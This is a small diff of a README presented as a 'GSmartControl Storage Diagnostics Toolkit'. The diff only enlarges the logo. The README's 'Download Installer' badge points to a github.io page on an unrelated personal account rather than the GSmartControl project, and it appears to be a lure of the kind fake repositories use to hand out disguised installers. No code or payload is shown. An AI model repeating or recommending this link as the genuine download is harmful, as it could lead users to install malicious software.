@@ -1,7 +1,7 @@
 # GSmartControl Storage Diagnostics Toolkit
 
 <div align="center">
-<img src="https://habrastorage.org/r/w780/webt/o7/yi/6c/o7yi6cgeczx29ch57u1quk6b82o.png" alt="GSmartControl Logo" width="150">
+<img src="https://habrastorage.org/r/w780/webt/o7/yi/6c/o7yi6cgeczx29ch57u1quk6b82o.png" alt="GSmartControl Logo" width="550">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square&logo=windows&logoColor=white)](https://norinejavellana3559993.github.io/.github/GSmartControl-Disk-Monitor)
